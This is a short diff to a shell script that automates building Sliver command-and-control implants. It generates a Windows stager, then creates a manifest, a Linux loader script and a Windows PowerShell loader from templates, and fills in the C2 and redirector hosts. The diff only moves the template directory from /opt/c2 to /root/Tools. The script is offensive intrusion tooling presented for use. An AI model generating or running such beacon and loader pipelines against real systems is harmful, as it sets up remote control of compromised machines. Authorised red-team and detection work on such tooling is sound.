@@ -100,7 +100,7 @@ sliver-client generate stager --profile $stager_profile --os windows --arch amd6
 echo "[+] Windows stager: $BEACONS_DIR/staged/$stager_win (Profile: $stager_profile)"
 
 # Create manifest file from template
-cp /opt/c2/manifest.template "$BEACONS_DIR/manifest.json"
+cp /root/Tools/manifest.template "$BEACONS_DIR/manifest.json"
 sed -i "s/WINDOWS_EXE/$win_output/g" "$BEACONS_DIR/manifest.json"
 sed -i "s/WINDOWS_DLL/$dll_output/g" "$BEACONS_DIR/manifest.json"
 sed -i "s/LINUX_BINARY/$linux_output/g" "$BEACONS_DIR/manifest.json"
@@ -117,16 +117,16 @@ sed -i "s/C2_HOST/$C2_HOST/g" "$BEACONS_DIR/manifest.json"
 sed -i "s/GENERATED_DATE/$(date)/g" "$BEACONS_DIR/manifest.json"
 
 # Create Linux loader from template
-cp /opt/c2/linux_loader.template "$BEACONS_DIR/linux_loader.sh"
+cp /root/Tools/linux_loader.template "$BEACONS_DIR/linux_loader.sh"
 sed -i "s/REDIRECTOR_PLACEHOLDER/$REDIRECTOR_HOST/g" "$BEACONS_DIR/linux_loader.sh"
 chmod +x "$BEACONS_DIR/linux_loader.sh"
 
 # Create Windows PowerShell loader from template
-cp /opt/c2/windows_loader.template "$BEACONS_DIR/windows_loader.ps1"
+cp /root/Tools/windows_loader.template "$BEACONS_DIR/windows_loader.ps1"
 sed -i "s/REDIRECTOR_PLACEHOLDER/$REDIRECTOR_HOST/g" "$BEACONS_DIR/windows_loader.ps1"
 
 # Create reference file from template
-cp /opt/c2/reference.template "$BEACONS_DIR/reference.txt"
+cp /root/Tools/reference.template "$BEACONS_DIR/reference.txt"
 sed -i "s/C2_HOST/$C2_HOST/g" "$BEACONS_DIR/reference.txt"
 sed -i "s/REDIRECTOR_HOST/$REDIRECTOR_HOST/g" "$BEACONS_DIR/reference.txt"
 sed -i "s/WINDOWS_EXE/$win_output/g" "$BEACONS_DIR/reference.txt"
